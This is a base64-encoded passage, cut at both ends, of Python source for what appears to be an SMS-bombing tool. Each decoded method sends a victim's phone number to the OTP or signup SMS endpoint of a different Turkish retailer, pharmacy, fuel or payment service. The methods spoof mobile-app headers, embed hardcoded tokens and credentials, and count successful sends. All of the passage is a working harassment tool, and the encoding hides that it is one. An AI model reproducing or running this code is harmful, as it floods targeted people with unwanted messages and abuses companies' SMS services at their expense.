cbn0iLAogICAgICAgICAgICAgICAgICAgICJ2YXJpYWJsZXMiOiB7InBob25lTnVtYmVyIjogZiI5MHtzZWxmLnBob25lfSJ9fQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsiZGF0YSJdWyJzZW5kT3RwMiJdWyJhbHJlYWR5U2VudCJdID09IEZhbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHByb2QuZmFzYXBpLm5ldCIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHByb2QuZmFzYXBpLm5ldCIpCgogICAgIyBrb3Rvbi5jb20KICAgIGRlZiBLb3RvbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3d3dy5rb3Rvbi5jb206NDQzL3VzZXJzL3JlZ2lzdGVyLyIKICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9c0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoayIsCiAgICAgICAgICAgICAgICAiWC1Qcm9qZWN0LU5hbWUiOiAicm4tZW52IiwgIkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLAogICAgICAgICAgICAgICAgIlgtQXBwLVR5cGUiOiAiYWtpbm9uLW1vYmlsZSIsICJYLVJlcXVlc3RlZC1XaXRoIjogIlhNTEh0dHBSZXF1ZXN0IiwKICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQ2FjaGUtQ29udHJvbCI6ICJuby1zdG9yZSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAiWC1BcHAtRGV2aWNlIjogImlvcyIsICJSZWZlcmVyIjogImh0dHBzOi8vd3d3LmtvdG9uLmNvbS8iLAogICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiS290b24vMSBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICJYLUNzcmZ0b2tlbiI6ICI1RER3Q216aVFoalNQOWlHaFlFOTU2SEh3N3dHYkVoazVrZWYyNlhNRndoRUxKQVdlYVBLM0EzdnVmeHp1V2N6In0KICAgICAgICAgICAgZGF0YSA9IGYiLS1zQ3YuOWtSRzczdmlvOE43aUxyYnBWNDRVTE84RzJpLldTYUE0bURaWUVKRmhTRVIuTG9kU0dLTUZTYUVRTnI2NWdIWGhrXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImZpcnN0X25hbWVcIlxyXG5cclxuTWVtYXRpXHJcbi0tc0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoa1xyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJsYXN0X25hbWVcIlxyXG5cclxuQmFzXHJcbi0tc0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoa1xyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJlbWFpbFwiXHJcblxyXG57c2VsZi5tYWlsfVxyXG4tLXNDdi45a1JHNzN2aW84TjdpTHJicFY0NFVMTzhHMmkuV1NhQTRtRFpZRUpGaFNFUi5Mb2RTR0tNRlNhRVFOcjY1Z0hYaGtcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwicGFzc3dvcmRcIlxyXG5cclxuMzFBQkMuLmFiYzMxXHJcbi0tc0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoa1xyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJwaG9uZVwiXHJcblxyXG4we3NlbGYucGhvbmV9XHJcbi0tc0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoa1xyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJjb25maXJtXCJcclxuXHJcbnRydWVcclxuLS1zQ3YuOWtSRzczdmlvOE43aUxyYnBWNDRVTE84RzJpLldTYUE0bURaWUVKRmhTRVIuTG9kU0dLTUZTYUVRTnI2NWdIWGhrXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cInNtc19hbGxvd2VkXCJcclxuXHJcbnRydWVcclxuLS1zQ3YuOWtSRzczdmlvOE43aUxyYnBWNDRVTE84RzJpLldTYUE0bURaWUVKRmhTRVIuTG9kU0dLTUZTYUVRTnI2NWdIWGhrXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImVtYWlsX2FsbG93ZWRcIlxyXG5cclxudHJ1ZVxyXG4tLXNDdi45a1JHNzN2aW84TjdpTHJicFY0NFVMTzhHMmkuV1NhQTRtRFpZRUpGaFNFUi5Mb2RTR0tNRlNhRVFOcjY1Z0hYaGtcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZGF0ZV9vZl9iaXJ0aFwiXHJcblxyXG4xOTkzLTA3LTAyXHJcbi0tc0N2LjlrUkc3M3ZpbzhON2lMcmJwVjQ0VUxPOEcyaS5XU2FBNG1EWllFSkZoU0VSLkxvZFNHS01GU2FFUU5yNjVnSFhoa1xyXG5jb250ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJjYWxsX2FsbG93ZWRcIlxyXG5cclxudHJ1ZVxyXG4tLXNDdi45a1JHNzN2aW84TjdpTHJicFY0NFVMTzhHMmkuV1NhQTRtRFpZRUpGaFNFUi5Mb2RTR0tNRlNhRVFOcjY1Z0hYaGtcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZ2VuZGVyXCJcclxuXHJcblxyXG4tLXNDdi45a1JHNzN2aW84TjdpTHJicFY0NFVMTzhHMmkuV1NhQTRtRFpZRUpGaFNFUi5Mb2RTR0tNRlNhRVFOcjY1Z0hYaGstLVxyXG4iCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAyOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGtvdG9uLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGtvdG9uLmNvbSIpCgogICAgIyBoYXlhdHN1LmNvbS50cgogICAgZGVmIEhheWF0c3Uoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly93d3cuaGF5YXRzdS5jb20udHI6NDQzL2FwaS9zaWdudXAvb3Rwc2VuZCIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAiQ2xzLVJlcXVlc3RpZCI6ICI5MTU5MDUxMzEiLCAiQWNjZXB0IjogIiovKiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1UUjtxPTEuMCwgdHItVFI7cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJQYXNzd29yZCI6ICJhZzIxMmk1MmZVa093eWMxWjIzNGFkSHMhNTJ5WFQ0dzc4N3FxMio9MTEydGF5IiwgIlVzZXJuYW1lIjogIk54bTFaSHMhIiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJIYXlhdFN1LzEuMC4yNiAoY29tLmhheWF0c3U7IGJ1aWxkOjQuMDsgaU9TIDE1LjcuNykgQWxhbW9maXJlLzEuMC4yNiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkNvbm5lY3Rpb24iOiAiY2xvc2UifQogICAgICAgICAgICBqc29uID0geyJtb2JpbGVQaG9uZU51bWJlciI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJJc1N1Y2Nlc3NmdWwiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGhheWF0c3UuY29tLnRyIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gaGF5YXRzdS5jb20udHIiKQoKICAgICMgcGlzaXIuY29tCiAgICBkZWYgUGlzaXIoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcGkucGlzaXIuY29tOjQ0My92MS9sb2dpbi8iCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICIqLyoiLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiUGlzaXIvMzg2IENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUifQogICAgICAgICAgICBqc29uID0geyJhcHBfYnVpbGQiOiAiMzg2IiwgImFwcF9wbGF0Zm9ybSI6ICJpb3MiLCAibXNpc2RuIjogZiIrOTB7c2VsZi5waG9uZX0ifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsib2siXSA9PSAiMSI6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLnBpc2lyLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS5waXNpci5jb20iKQoKICAgICMgaGl6bGllY3phLmNvbS50cgogICAgZGVmIEhpemxpZWN6YShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2hpemxpZWN6YXByb2RhcGkuaGl6bGllY3phLm5ldDo0NDMvbW9iaWwvYWNjb3VudC9zZW5kT1RQIgogICAgICAgICAgICBoZWFkZXJzID0geyJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJoaXpsaWVjemEvMTIgQ0ZOZXR3b3JrLzEzMzUuMC4zLjIgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBdXRob3JpemF0aW9uIjogIkJlYXJlciBudWxsIn0KICAgICAgICAgICAganNvbiA9IHsib3RwT3BlcmF0aW9uVHlwZSI6IDIsICJwaG9uZU51bWJlciI6IGYiKzkwe3NlbGYucGhvbmV9In0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbImlzU3VjY2VzcyJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gaGl6bGllY3phcHJvZGFwaS5oaXpsaWVjemEubmV0IikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gaGl6bGllY3phcHJvZGFwaS5oaXpsaWVjemEubmV0IikKCiAgICAjIGlwcmFnYXouY29tLnRyCiAgICBkZWYgSXByYWdheihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2lwYXBwLmlwcmFnYXouY29tLnRyOjQ0My9pcHJhZ2F6bW9iaWxlL3YyL2lwcmFnYXotYjJjL2lwcmFnYXotY3VzdG9tZXIvbW9iaWxlLXJlZ2lzdGVyLW90cCIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAiWC1BcGktVG9rZW4iOiAiIiwgIkF1dGhvcml6YXRpb24iOiAiIiwKICAgICAgICAgICAgICAgICAgICAgICAiQXBwLVZlcnNpb24iOiAiMS4zLjkiLCAiQXBwLUxhbmciOiAiZW4iLCAiQWNjZXB0IjogIiovKiIsICJBcHAtTmFtZSI6ICJpcHJhZ2F6LW1vYmlsZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIk9zIjogImlvcyIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVFI7cT0xLjAsIHRyLVRSO3E9MC45IiwgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJpcHJhZ2F6LW1vYmlsZS8xLjMuOSAoY29tLmlwcmFnYXouaXBhcHA7IGJ1aWxkOjQxOyBpT1MgMTUuNy43KSBBbGFtb2ZpcmUvNS42LjQiLAogICAgICAgICAgICAgICAgICAgICAgICJBcHAtQnVpbGQiOiAiNDEiLCAiT3MtVmVyc2lvbiI6ICIxNS43LjciLCAiVWRpZCI6ICI3M0FEMkQ2RS05RkM3LTQwQzEtQUZGMy04OEU2NzU5MURDRjgiLAogICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAganNvbiA9IHsiYmlydGhEYXRlIjogIjIvNy8yMDAwIiwgImNhclBsYXRlIjogIjMxIEFCQyAzMSIsCiAgICAgICAgICAgICAgICAgICAgIm1vYmlsZU90cCI6ICJmMzJjNzllNjVjYzY4NGExNGIxNWRjYjlkYzdlOWU5ZDkyYjJmNmQyNjlmZDkwMDBhN2I3NWUwMmNmZDhmYTYzIiwKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJNZW1hdGkgQmFzIiwgIm90cCI6ICIiLCAicGhvbmVOdW1iZXIiOiBzZWxmLnBob25lLCAicGxheWVySWQiOiAiIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gaXBhcHAuaXByYWdhei5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBpcGFwcC5pcHJhZ2F6LmNvbS50ciIpCgogICAgIyBtZXRyby10ci5jb20KICAgIGRlZiBNZXRybyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2ZlYXR1cmUubWV0cm8tdHIuY29tOjQ0My9hcGkvbW9iaWxlQXV0aC92YWxpZGF0ZVNtc1NlbmQiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICIqLyoiLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJBcHBsaWNhdGlvbnZlcnNpb24iOiAiMi4xLjEiLCAiQXBwbGljYXRpb25wbGF0Zm9ybSI6ICIyIiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNZXRybyBUdXJraXllLzIuMS4xIChjb20ubWNjdHIubW9iaWxlYXBwbGljYXRpb247IGJ1aWxkOjE7IGlPUyAxNS43LjcpIEFsYW1vZmlyZS8yLjEuMSIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1UUjtxPTEuMCwgdHItVFI7cT0wLjkiLCAiQ29ubmVjdGlvbiI6ICJjbG9zZSJ9CiAgICAgICAgICAgIGpzb24gPSB7Im1ldGhvZFR5cGUiOiAiMiIsICJtb2JpbGVQaG9uZU51bWJlciI6IGYiKzkwe3NlbGYucGhvbmV9In0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInN0YXR1cyJdID09ICJzdWNjZXNzIjoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBmZWF0dXJlLm1ldHJvLXRyLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGZlYXR1cmUubWV0cm8tdHIuY29tIikKCiAgICAjIGt1bXBvcnQuY29tLnRyCiAgICBkZWYgS3VtcG9ydChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9vbmxpbmUua3VtcG9ydC5jb20udHI6NDQzL0FwaS9DbGllbnQvQ2FsbEFwaT9hY3Rpb249a3VtcG9ydC9Vc2VyL1NlbmRTbXNDb2RlVG9Vc2VyP3Bob25lTnVtYmVyPXtzZWxmLnBob25lfV9BTkRfaXA9IgogICAgICAgICAgICBoZWFkZXJzID0geyJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJ0ci1UUix0cjtxPTAuOCxlbi1VUztxPTAuNSxlbjtxPTAuMyIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtWHNyZi1Ub2tlbiI6ICJkTFctZ3lpRXVYVkFYNDJreGRnY2NGanJDdUNrbE1fWnF2d2Z6VHRVRWluSjVRQV81NE1KNGpJNzFKR19ZekVnek5XdEt0UnVJQjlPbUNXaXo0UUt2VGxPLUZEVHNQd1MydFlwRzRBeFBubzEiLAogICAgICAgICAgICAgICAgICAgICAgICJEbnQiOiAiMSIsICJSZWZlcmVyIjogImh0dHBzOi8vb25saW5lLmt1bXBvcnQuY29tLnRyLyIsICJTZWMtRmV0Y2gtRGVzdCI6ICJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlNlYy1GZXRjaC1Nb2RlIjogImNvcnMiLCAiU2VjLUZldGNoLVNpdGUiOiAic2FtZS1vcmlnaW4iLCAiVGUiOiAidHJhaWxlcnMiLAogICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycywgdmVyaWZ5PUZhbHNlKQogICAgICAgICAgICBpZiByLnRleHQucmVwbGFjZSgiXCIiLCAiIikuc3BsaXQoIiwiKVsxXS5zcGxpdCgiOiIpWzFdLmxvd2VyKCkgPT0gInRydWUiOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IG9ubGluZS5rdW1wb3J0LmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IG9ubGluZS5rdW1wb3J0LmNvbS50ciIpCgogICAgIyBxdW1wYXJhLmNvbQogICAgZGVmIFF1bXBhcmEoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly90ci1hcGkuZmlzaWNlay5jb206NDQzL3YxLjMvYXV0aC9nZXRPVFAiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogInF1bXBhcmEvNC4yLjUzIChpUGhvbmU7IGlPUyAxNS43Ljc7IFNjYWxlLzMuMDApIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVRSO3E9MSwgdHItVFI7cT0wLjkifQogICAgICAgICAgICBqc29uID0geyJtc2lzZG4iOiBmIis5MHtzZWxmLnBob25lfSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHRyLWFwaS5maXNpY2VrLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHRyLWFwaS5maXNpY2VrLmNvbSIpCgogICAgIyBwYXlib2wuY29tLnRyCiAgICBkZWYgUGF5Ym9sKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vcHliLW1vYmlsZWFwaS53YWxsZXRnYXRlLmlvOjQ0My92MS9BY2NvdW50L1JlZ2lzdGVyUGVyc29uYWxBY2NvdW50U2VuZE90cFNtcyIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24iLCAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIlBheWJvbC8xLjIuMSAoY29tLmFwcC5wYXlib2w7IGJ1aWxkOjE7IGlPUyAxNS43LjcpIEFsYW1vZmlyZS81LjUuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1UUjtxPTEuMCwgdHItVFI7cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAganNvbiA9IHsicGhvbmVfbnVtYmVyIjogZiI5MHtzZWxmLnBob25lfSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJzdGF0dXMiXSA9PSAwOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHB5Yi1tb2JpbGVhcGkud2FsbGV0Z2F0ZS5pbyIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHB5Yi1tb2JpbGVhcGkud2FsbGV0Z2F0ZS5pbyIpCgogICAgIyBtaWdyb3MuY29tLnRyCiAgICBkZWYgTWlncm9zKHNlbGYpO